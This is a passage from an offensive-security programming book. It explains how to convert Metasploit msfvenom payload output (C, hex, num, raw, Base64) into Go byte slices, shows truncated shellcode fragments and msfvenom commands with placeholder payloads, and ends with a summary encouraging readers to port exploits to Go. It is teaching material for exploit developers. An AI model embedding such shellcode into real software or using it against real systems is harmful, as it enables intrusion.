<p class="indent">The Metasploit Framework, a popular exploitation and post-exploitation toolkit, ships with <code>msfvenom</code>, a tool that generates and transforms any of Metasploit’s available payloads to a variety of formats specified via the <code>-f</code> argument. Unfortunately, there is no explicit Go transform. However, you can integrate several formats into your Go code fairly easily with minor adjustments. We’ll explore five of these formats here: C, <code>hex</code>, <code>num</code>, <code>raw</code>, and Base64, while keeping in mind that our end goal is to create a byte slice in Go.</p>&#13;
<h4 class="h4" id="ch9lev2sec5">C Transform</h4>&#13;
<p class="noindent">If you specify a C transform type, <code>msfvenom</code> will produce the payload in a format that you can directly place into C code. This may seem like the logical first choice, since we detailed many of the similarities between C and Go earlier in this chapter. However, it’s not the best candidate for our Go code. To show you why, look at the following sample output in C format:</p>&#13;
<pre>unsigned char buf[] =&#13;
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"&#13;
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"&#13;
<span class="codeitalic1">--snip--</span>&#13;
"\x64\x00";</pre>&#13;
<p class="indent">We’re interested almost exclusively in the payload. To make it Go-friendly, you’ll have to remove the semicolon and alter the line breaks. This means you’ll either need to explicitly append each line by adding a <code>+</code> to the end of all lines except the last, or remove the line breaks altogether to produce one long, continuous string. For small payloads this may be acceptable, but for larger payloads this becomes tedious to do manually. You’ll find yourself likely turning to other Linux commands such as <code>sed</code> and <code>tr</code> to clean it up.</p>&#13;
<p class="indent">Once you clean up the payload, you’ll have your payload as a string. To create a byte slice, you’d enter something like this:</p>&#13;
<pre>payload := []byte("\xfc\xe8\x82...").</pre>&#13;
<p class="indent">It’s not a bad solution, but you can do better.</p>&#13;
<h4 class="h4" id="ch9lev2sec6"><span epub:type="pagebreak" id="page_214"/>Hex Transform</h4>&#13;
<p class="noindent">Improving upon the previous attempt, let’s look at a <code>hex</code> transform. With this format, <code>msfvenom</code> produces a long, continuous string of hexadecimal characters:</p>&#13;
<pre>fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ff...6400</pre>&#13;
<p class="indent">If this format looks familiar, it’s because you used it when porting the Java deserialization exploit. You passed this value as a string into a call to <code>hex.DecodeString()</code>. It returns a byte slice and error details, if present. You could use it like so:</p>&#13;
<pre>payload, err := hex.DecodeString("fce8820000006089e531c0648b50308b520c8b52148b&#13;
72280fb74a2631ff...6400")</pre>&#13;
<p class="indent">Translating this to Go is pretty simple. All you have to do is wrap your string in double quotes and pass it to the function. However, a large payload will produce a string that may not be aesthetically pleasing, wrapping lines or running beyond recommended page margins. You may still want to use this format, but we’ve provided a third alternative in the event that you want your code to be both functional and pretty.</p>&#13;
<h4 class="h4" id="ch9lev2sec7">Num Transform</h4>&#13;
<p class="noindent">A <code>num</code> transform produces a comma-separated list of bytes in numerical, hexadecimal format:</p>&#13;
<pre>0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,&#13;
0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,&#13;
<span class="codeitalic1">--snip--</span>&#13;
0x64, 0x00</pre>&#13;
<p class="indent">You can use this output in the direct initialization of a byte slice, like so:</p>&#13;
<pre>payload := []byte{&#13;
    0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,&#13;
    0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,&#13;
    <span class="codeitalic1">--snip--</span>&#13;
    0x64, 0x00,&#13;
}</pre>&#13;
<p class="indent">Because the <code>msfvenom</code> output is comma-separated, the list of bytes can wrap nicely across lines without clumsily appending data sets. The only modification required is the addition of a single comma after the last element in the list. This output format is easily integrated into your Go code and formatted pleasantly.</p>&#13;
<h4 class="h4" id="ch9lev2sec8"><span epub:type="pagebreak" id="page_215"/>Raw Transform</h4>&#13;
<p class="noindent">A <code>raw</code> transform produces the payload in raw binary format. The data itself, if displayed on the terminal window, likely produces unprintable characters that look something like this:</p>&#13;
<pre>ÐÐÐ`ÐÐ1ÐdÐP0ÐR&#13;
Ð8ÐuÐ}Ð;}$uÐXÐX$ÐfÐY IÐ:IÐ4ÐÐ1ÐÐÐÐ</pre>&#13;
<p class="indent">You can’t use this data in your code unless you produce it in a different format. So why, you may ask, are we even discussing raw binary data? Well, because it’s fairly common to encounter raw binary data, whether as a payload generated from a tool, the contents of a binary file, or crypto keys. Knowing how to recognize binary data and work it into your Go code will prove valuable.</p>&#13;
<p class="indent">Using the <code>xxd</code> utility in Linux with the <code>-i</code> command line switch, you can easily transform your raw binary data into the <code>num</code> format of the previous section. A sample <code>msfvenom</code> command would look like this, where you pipe the raw binary output produced by <code>msfvenom</code> into the <code>xxd</code> command:</p>&#13;
<pre>$ msfvenom <span class="codestrong1">-p [<span class="codeitalic1">payload</span><span class="codestrong1">] [</span><span class="codeitalic1">options</span></span><span class="codestrong1">] - f raw | xxd -i</span></pre>&#13;
<p class="indent">You can assign the result directly to a byte slice as demonstrated in the previous section.</p>&#13;
<h4 class="h4" id="ch9lev2sec9">Base64 Encoding</h4>&#13;
<p class="noindent">Although <code>msfvenom</code> doesn’t include a pure Base64 encoder, it’s fairly common to encounter binary data, including shellcode, in Base64 format. Base64 encoding extends the length of your data, but also allows you to avoid ugly or unusable raw binary data. This format is easier to work with in your code than <code>num</code>, for example, and can simplify data transmission over protocols such as HTTP. For that reason, it’s worth discussing its usage in Go.</p>&#13;
<p class="indent">The easiest method to produce a Base64-encoded representation of binary data is to use the <code>base64</code> utility in Linux. It allows you to encode or decode data via stdin or from a file. You could use <code>msfvenom</code> to produce raw binary data, and then encode the result by using the following command:</p>&#13;
<pre>$ msfvenom <span class="codestrong1">-p [<span class="codeitalic1">payload</span><span class="codestrong1">] [</span><span class="codeitalic1">options</span><span class="codestrong1">]</span> - f raw | base64</span></pre>&#13;
<p class="indent">Much like your C output, the resulting payload contains line breaks that you’ll have to deal with before including it as a string in your code. You can use the <code>tr</code> utility in Linux to clean up the output, removing all line breaks:</p>&#13;
<pre>$ msfvenom <span class="codestrong1">-p [<span class="codeitalic1">payload</span><span class="codestrong1">] [</span><span class="codeitalic1">options</span><span class="codestrong1">]</span> - f raw | base64 | tr -d "\n"</span></pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_216"/>The encoded payload will now exist as a single, continuous string. In your Go code, you can then get the raw payload as a byte slice by decoding the string. You use the <code>encoding/base64</code> package to get the job done:</p>&#13;
<pre>payload, err := base64.StdEncoding.DecodeString("/OiCAAAAYInlMcBki1Awi...WFuZAA=")</pre>&#13;
<p class="indent">You’ll now have the ability to work with the raw binary data without all the ugliness.</p>&#13;
<h4 class="h4" id="ch9lev2sec10">A Note on Assembly</h4>&#13;
<p class="noindent">A discussion of shellcode and low-level programming isn’t complete without at least mentioning assembly. Unfortunately for the shellcode composers and assembly artists, Go’s integration with assembly is limited. Unlike C, Go doesn’t support inline assembly. If you want to integrate assembly into your Go code, you can do that, sort of. You’ll have to essentially define a function prototype in Go with the assembly instructions in a separate file. You then run <code>go build</code> to compile, link, and build your final executable. While this may not seem overly daunting, the problem is the assembly language itself. Go supports only a variation of assembly based on the Plan 9 operating system. This system was created by Bell Labs and used in the late 20th century. The assembly syntax, including available instructions and opcodes, is almost nonexistent. This makes writing pure Plan 9 assembly a daunting, if not nearly impossible, task.</p>&#13;
<h3 class="h3" id="ch9lev1sec4">Summary</h3>&#13;
<p class="noindent">Despite lacking assembly usability, Go’s standard packages offer a tremendous amount of functionality conducive to vulnerability hunters and exploit developers. This chapter covered fuzzing, porting exploits, and handling binary data and shellcode. As an additional learning exercise, we encourage you to explore the exploit database at <a href="https://www.exploit-db.com/"><em>https://www.exploit-db.com/</em></a> and try to port an existing exploit to Go. Depending on your comfort level with the source language, this task could seem overwhelming but it can be an excellent opportunity to understand data manipulation, network communications, and low-level system interaction.</p>&#13;
<p class="indent">In the next chapter, we’ll step away from exploitation activities and focus on producing extendable toolsets.</p>&#13;
</div>



  </body></html>